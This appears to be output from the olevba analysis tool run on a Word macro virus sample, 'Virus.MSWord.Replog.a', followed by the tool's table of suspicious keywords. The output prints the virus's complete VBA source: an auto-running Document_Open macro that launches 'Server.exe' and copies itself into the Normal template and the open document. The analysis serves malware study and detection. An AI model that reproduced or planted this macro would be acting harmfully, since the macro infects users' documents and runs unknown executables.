olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Replog.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Shell "I:\Eudora\Sys\Server.exe"
Set TD = ThisDocument.VBProject.VBComponents(1)
Set AD = ActiveDocument.VBProject.VBComponents(1)
Set NT = NormalTemplate.VBProject.VBComponents(1)
VCode = TD.CodeModule.Lines(1, TD.CodeModule.CountOfLines)
NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
NT.CodeModule.InsertLines 1, VCode
AD.CodeModule.InsertLines 1, VCode
ActiveDocument.Save
NormalTemplate.Save

Open "I:\Rep.log" For Append As #1
Print #1, "Active on " & Date
Close
End Sub
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod6.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod1.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod2.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod3.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod4.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordTmpDDEMod5.bas 
in file: ./Virus.MSWord.Replog.a - OLE stream: 'Macros/VBA/WordTmpDDEMod5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Server.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

